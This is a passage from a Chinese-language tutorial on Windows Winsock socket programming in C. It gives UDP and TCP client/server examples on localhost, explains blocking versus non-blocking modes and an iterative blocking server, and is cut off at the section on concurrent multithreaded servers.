iResult;</span><br><span class="line">    SOCKET client_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from client&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((client_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器地址</span></span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    serv_addr.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将IP地址从字符串转换为网络地址</span></span><br><span class="line">    <span class="keyword">if</span> (inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;serv_addr.sin_addr) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;inet_pton failed&quot;</span>);</span><br><span class="line">        closesocket(client_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到服务器</span></span><br><span class="line">    <span class="keyword">if</span> (connect(client_fd, (<span class="keyword">struct</span> sockaddr *)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;connect failed&quot;</span>);</span><br><span class="line">        closesocket(client_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据到服务器</span></span><br><span class="line">    send(client_fd, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取服务器发送的数据</span></span><br><span class="line">    iResult = recv(client_fd, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    closesocket(client_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="面向非连接的SOCKET编程"><a href="#面向非连接的SOCKET编程" class="headerlink" title="面向非连接的SOCKET编程"></a>面向非连接的SOCKET编程</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>面向非连接（UDP）的特点：</p>
<p>1.不需要在服务端和客户端之间进建立连接</p>
<p>2.不对收到的数据进行排序</p>
<p>3.对接收到的数据包不发送确认信息，发送端无法知道数据是否被正确接收，也不会重新发送数据</p>
<p>4.传送数据较TCP快，系统开销也少</p>
<h3 id="UDP连接流程"><a href="#UDP连接流程" class="headerlink" title="UDP连接流程"></a>UDP连接流程</h3><table>
<thead>
<tr>
<th>主机流程（UDP）</th>
<th>客户端流程</th>
</tr>
</thead>
<tbody><tr>
<td>1.建立流式套接字</td>
<td>1.建立流式套接字</td>
</tr>
<tr>
<td>2.套接字：与本地地址绑定</td>
<td></td>
</tr>
<tr>
<td>3.在套接字上读&#x2F;写数据</td>
<td>2.在套接字上读&#x2F;写数据</td>
</tr>
<tr>
<td>4.关闭套接字</td>
<td>3.关闭套接字</td>
</tr>
</tbody></table>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET server_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from server&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket到端口</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收数据</span></span><br><span class="line">    iResult = recvfrom(server_fd, buffer, BUFSIZE, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;addrlen);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recvfrom failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据</span></span><br><span class="line">    sendto(server_fd, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, addrlen);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET client_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from client&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((client_fd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器地址</span></span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    serv_addr.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将IP地址从字符串转换为网络地址</span></span><br><span class="line">    <span class="keyword">if</span> (inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;serv_addr.sin_addr) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;inet_pton failed&quot;</span>);</span><br><span class="line">        closesocket(client_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据到服务器</span></span><br><span class="line">    sendto(client_fd, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收服务器发送的数据</span></span><br><span class="line">    iResult = recvfrom(client_fd, buffer, BUFSIZE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recvfrom failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    closesocket(client_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="阻塞式模型"><a href="#阻塞式模型" class="headerlink" title="阻塞式模型"></a>阻塞式模型</h2><h3 id="阻塞式"><a href="#阻塞式" class="headerlink" title="阻塞式"></a>阻塞式</h3><p>什么是阻塞式？</p>
<p>1.在创建一个套接字后，默认都是阻塞式的Winsocket的IO函数比如：Send和Recv，必须等待函数完成相应的I&#x2F;O操作后，才能继续</p>
<p>什么是非阻塞式？</p>
<p>1.通过调用ioctlsocket(SOCKET s, long cmd, u_long *arpg)函数，改变该套接字的模式，<br>U_long nNoBlock &#x3D;1;<br>loctlsocket(s,FIONBIO,&amp;nNoBlock);</p>
<p>2.无论操作是否完成，非阻塞式函数都会立即返回。例如，在非阻塞模式下调用recv接收数据时，程序会直接读取网络缓冲区中的数据。无论是否读到数据，函数都会立即返回</p>
<h3 id="阻塞式迭代模式"><a href="#阻塞式迭代模式" class="headerlink" title="阻塞式迭代模式"></a>阻塞式迭代模式</h3><p>1.每次只服务一个连接，只有在服务完当前客户端连接之后，才会继续服务下一个客户端连接</p>
<h4 id="阻塞式迭代模式步骤"><a href="#阻塞式迭代模式步骤" class="headerlink" title="阻塞式迭代模式步骤"></a>阻塞式迭代模式步骤</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.先处理连接 绑定本地地址和监听</span></span><br><span class="line">SOCKET <span class="title function_">Bind_Listen</span><span class="params">(<span class="type">int</span> nBacklog)</span></span><br><span class="line"><span class="comment">// 2.接收一个客户端连接并返回对应的连接的套接字</span></span><br><span class="line">SOCKET <span class="title function_">AcceptConnetion</span><span class="params">(SOCKET hSocket)</span></span><br><span class="line"><span class="comment">// 3.处理一个客户端的连接，实现接收和发送数据</span></span><br><span class="line">BOOL <span class="title function_">ClientConFun</span><span class="params">(SOCKET sd)</span></span><br><span class="line"><span class="comment">// 4.关闭一个连接</span></span><br><span class="line">BOOL <span class="title function_">CloseConnect</span><span class="params">(SOCKET sd)</span></span><br><span class="line"><span class="comment">// 5.服务器主体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyTepSerFun</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><h5 id="服务端-2"><a href="#服务端-2" class="headerlink" title="服务端"></a>服务端</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 先处理连接 绑定本地地址和监听</span></span><br><span class="line">SOCKET <span class="title function_">Bind_Listen</span><span class="params">(<span class="type">int</span> nBacklog)</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET server_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket到端口</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_fd, nBacklog) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> server_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 接收一个客户端连接并返回对应的连接的套接字</span></span><br><span class="line">SOCKET <span class="title function_">AcceptConnetion</span><span class="params">(SOCKET hSocket)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    SOCKET new_socket = accept(hSocket, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;addrlen);</span><br><span class="line">    <span class="keyword">if</span> (new_socket == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> new_socket;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 处理一个客户端的连接，实现接收和发送数据</span></span><br><span class="line">BOOL <span class="title function_">ClientConFun</span><span class="params">(SOCKET sd)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from server&quot;</span>;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收数据</span></span><br><span class="line">    iResult = recv(sd, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connection closing...\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据</span></span><br><span class="line">    send(sd, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 关闭一个连接</span></span><br><span class="line">BOOL <span class="title function_">CloseConnect</span><span class="params">(SOCKET sd)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (closesocket(sd) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;closesocket&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 服务器主体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyTepSerFun</span><span class="params">()</span> &#123;</span><br><span class="line">    SOCKET server_fd = Bind_Listen(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (server_fd == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        SOCKET client_socket = AcceptConnetion(server_fd);</span><br><span class="line">        <span class="keyword">if</span> (client_socket != INVALID_SOCKET) &#123;</span><br><span class="line">            ClientConFun(client_socket);</span><br><span class="line">            CloseConnect(client_socket);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    MyTepSerFun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="客户端-2"><a href="#客户端-2" class="headerlink" title="客户端"></a>客户端</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET client_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from client&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((client_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器地址</span></span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    serv_addr.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将IP地址从字符串转换为网络地址</span></span><br><span class="line">    <span class="keyword">if</span> (inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;serv_addr.sin_addr) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;inet_pton failed&quot;</span>);</span><br><span class="line">        closesocket(client_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到服务器</span></span><br><span class="line">    <span class="keyword">if</span> (connect(client_fd, (<span class="keyword">struct</span> sockaddr *)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;connect failed&quot;</span>);</span><br><span class="line">        closesocket(client_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据到服务器</span></span><br><span class="line">    send(client_fd, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收服务器发送的数据</span></span><br><span class="line">    iResult = recv(client_fd, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    closesocket(client_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="阻塞式并发连接模式"><a href="#阻塞式并发连接模式" class="headerlink" title="阻塞式并发连接模式"></a>阻塞式并发连接模式</h3><p>1.通过多线程，可以同时服务多个连接，每一个线程处理一个客户端连接</p>
<p>和迭代模式基本相同，只是在于处理客户端连接上，需要用到多线程处理多线程来处理客户端连接，以给予服务端同时处理业务的能力。</p>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><p>主要是针对服务端的代码，所以这里只写服务端</p>
